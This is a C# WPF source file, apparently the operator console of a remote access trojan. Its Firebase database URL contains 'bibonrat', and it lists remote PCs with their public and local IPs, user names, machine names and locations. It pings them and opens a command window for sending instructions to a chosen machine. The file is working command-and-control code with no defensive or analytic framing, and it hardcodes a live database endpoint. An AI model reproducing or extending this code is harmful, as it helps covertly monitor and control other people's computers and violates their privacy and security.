using Shared;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Web.Script.Serialization; // System.Web.Extensions
using System.Windows;
using Shared; // важно


namespace BibonAI
{
    public partial class MainWindow : Window
    {
        private const string BaseUrl = "https://bibonrat-default-rtdb.asia-southeast1.firebasedatabase.app";
        private const string AuthToken = ""; // если БД открыта – оставить пустым

        public MainWindow()
        {
            InitializeComponent();
            // MainWindow.xaml.cs (BibonAI) – в конструкторе после InitializeComponent:
            PcList.MouseDoubleClick += (s, e) =>
            {
                var item = PcList.SelectedItem as PcItem;
                if (item == null) return;
                var w = new CommandWindow(BaseUrl, AuthToken, item.Key) { Owner = this };
                w.ShowDialog();
            };

        }

        private async void Window_Loaded(object sender, RoutedEventArgs e)
        {
            await EnsureAndLoadAsync();
        }

        private async void Refresh_Click(object sender, RoutedEventArgs e)
        {
            await LoadPcListAsync();
        }

        private async Task EnsureAndLoadAsync()
        {
            try
            {
                using (var fb = new FirebaseRtdb(BaseUrl, AuthToken))
                {
                    await fb.EnsureMapNodeAsync("PC List");
                }
            }
            catch (Exception ex)
            {
                Status.Text = "Ошибка при создании узла: " + ex.Message;
                return;
            }

            await LoadPcListAsync();
        }

        // ----- модель строки -----
        // ---- МОДЕЛЬ ДЛЯ СПИСКА ----
        public class PcItem
        {
            public string Key { get; set; }
            public string InternetIp { get; set; }
            public int Online { get; set; }
            public string OnlineText { get { return Online == 1 ? "ON" : "OFF"; } }
            public string StartTime { get; set; }
            public string StopTime { get; set; }
            public string PcName { get; set; }
            public string UserName { get; set; }
            public string RAM { get; set; }
            public string LocalIp { get; set; }
            public string Country { get; set; }
            public string Region { get; set; }
            public string City { get; set; }
        }

        private static int AsInt(object o)
        {
            if (o == null) return 0;
            if (o is int) return (int)o;
            if (o is long) return (int)(long)o;
            int x; return int.TryParse(o.ToString(), out x) ? x : 0;
        }

        private static string GetStr(System.Collections.Generic.Dictionary<string, object> d, string key)
        {
            if (d == null) return "";
            object v;
            return d.TryGetValue(key, out v) && v != null ? v.ToString() : "";
        }

        // ---- ЧТЕНИЕ ИЗ ВЛОЖЕННЫХ УЗЛОВ "Online or ofline" и "System Information" ----
        private async Task LoadPcListAsync()
        {
            try
            {
                Status.Text = "Загрузка...";
                var items = new System.Collections.Generic.List<PcItem>();

                using (var fb = new Shared.FirebaseRtdb(BaseUrl, AuthToken))
                {
                    var json = await fb.GetJsonAsync("PC List");
                    if (!string.IsNullOrEmpty(json) && json != "null")
                    {
                        var ser = new System.Web.Script.Serialization.JavaScriptSerializer();
                        var root = ser.Deserialize<System.Collections.Generic.Dictionary<string, object>>(json);

                        foreach (var kv in root)
                        {
                            var node = kv.Value as System.Collections.Generic.Dictionary<string, object>;
                            if (node == null) continue;

                            // из-за опечатки поддержим оба варианта: "ofline" и "offline"
                            object onlineNodeObj = null;
                            node.TryGetValue("Online or ofline", out onlineNodeObj);
                            if (onlineNodeObj == null) node.TryGetValue("Online or offline", out onlineNodeObj);
                            var onlineNode = onlineNodeObj as System.Collections.Generic.Dictionary<string, object>;

                            object sysNodeObj = null;
                            node.TryGetValue("System Information", out sysNodeObj);
                            var sysNode = sysNodeObj as System.Collections.Generic.Dictionary<string, object>;

                            var item = new PcItem
                            {
                                Key = kv.Key,
                                InternetIp = GetStr(onlineNode, "internet_ip"),
                                Online = AsInt(onlineNode != null ? (onlineNode.ContainsKey("PC Online or offline") ? onlineNode["PC Online or offline"] : null) : null),
                                StartTime = GetStr(onlineNode, "start_time"),
                                StopTime = GetStr(onlineNode, "stop_time"),

                                PcName = GetStr(sysNode, "PC Name"),
                                UserName = GetStr(sysNode, "User Name"),
                                RAM = GetStr(sysNode, "RAM"),
                                LocalIp = GetStr(sysNode, "Local IP"),
                                Country = GetStr(sysNode, "Country"),
                                Region = GetStr(sysNode, "Region"),
                                City = GetStr(sysNode, "City")
                            };

                            items.Add(item);
                        }
                    }
                }

                items = items.OrderBy(i => i.Key).ToList();
                PcList.ItemsSource = items;
                Status.Text = "Загружено: " + items.Count;
            }
            catch (Exception ex)
            {
                Status.Text = "Ошибка чтения: " + ex.Message;
            }
        }

        // ----- Ping → Pong -----
        // ПИНГ одного ПК
        private async Task<bool> PingPcAsync(string key)
        {
            var token = Guid.NewGuid().ToString("N");

            // 1) ping -> внутрь "Online or ofline"
            using (var fb = new FirebaseRtdb(BaseUrl, AuthToken))
                await fb.PutRawJsonAsync($"PC List/{key}/Online or ofline/ping", $"\"{token}\"");

            // 2) ждём ответ
            await Task.Delay(2500);

            // 3) читаем pong из того же места
            string reply;
            using (var fb = new FirebaseRtdb(BaseUrl, AuthToken))
            {
                var json = await fb.GetJsonAsync($"PC List/{key}/Online or ofline/pong");
                reply = (string.IsNullOrEmpty(json) || json == "null") ? "" : json.Trim().Trim('"');
            }

            bool online = (reply == token);

            // 4) фиксируем статус 1/0 (там же)
            using (var fb = new FirebaseRtdb(BaseUrl, AuthToken))
                await fb.PutRawJsonAsync($"PC List/{key}/Online or ofline/PC Online or offline", online ? "1" : "0");

            return online;
        }


        private string ChatPathCtrl(string pcKey, string name)
    => $"PC List/{pcKey}/Chat/Control/{name}";

        private string ChatPathPres(string pcKey, string name)
            => $"PC List/{pcKey}/Chat/Presence/{name}";

        // обработчик кнопки «Проверить (Ping)»
        private async void PingAll_Click(object sender, RoutedEventArgs e)
        {
            var items = PcList.ItemsSource as List<PcItem>;
            if (items == null || items.Count == 0)
            {
                Status.Text = "Нет элементов";
                return;
            }

            Status.Text = "Пингую " + items.Count + "...";
            int onlineCount = 0;

            // последовательно, чтобы не спамить БД
            foreach (var it in items)
            {
                bool online = await PingPcAsync(it.Key);
                it.Online = online ? 1 : 0;      // чтобы колонка Online обновилась
                PcList.Items.Refresh();

                if (online)
                {
                    onlineCount++;
                    // если хочешь ещё и чат включать для онлайн-клиентов,
                    // можешь раскомментировать этот блок:
                    /*
                    using (var fb = new FirebaseRtdb(BaseUrl, AuthToken))
                    {
                        await fb.PutRawJsonAsync(ChatPathCtrl(it.Key, "ClientOpen"), "1");
                        await fb.PutRawJsonAsync(ChatPathPres(it.Key, "ClientOnline"), "1");
                    }
                    */
                }
                else
                {
                    // КЛИЕНТ ОФФЛАЙН → ДЕЛАЕМ ЧАТ ОФФЛАЙН
                    using (var fb = new FirebaseRtdb(BaseUrl, AuthToken))
                    {
                        await fb.PutRawJsonAsync(ChatPathCtrl(it.Key, "ClientOpen"), "0");   // админ увидит «офлайн»
                        await fb.PutRawJsonAsync(ChatPathPres(it.Key, "ClientOnline"), "0");
                    }
                }
            }

            Status.Text = "Онлайн: " + onlineCount + " / " + items.Count;
        }

    }
}